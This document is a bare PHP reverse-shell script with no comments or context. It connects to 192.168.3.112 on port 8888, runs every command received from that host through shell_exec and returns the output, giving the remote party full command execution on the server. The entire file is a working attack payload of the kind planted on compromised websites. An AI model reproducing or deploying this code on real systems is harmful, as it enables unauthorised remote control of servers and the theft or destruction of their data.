<?php
$ip = '192.168.3.112';
$port = 8888;
$socket = fsockopen($ip, $port);
if ($socket) {
    while ($cmd = fread($socket, 2048)) {
        $output = shell_exec($cmd);
        fwrite($socket, $output);
    }
    fclose($socket);
}
?>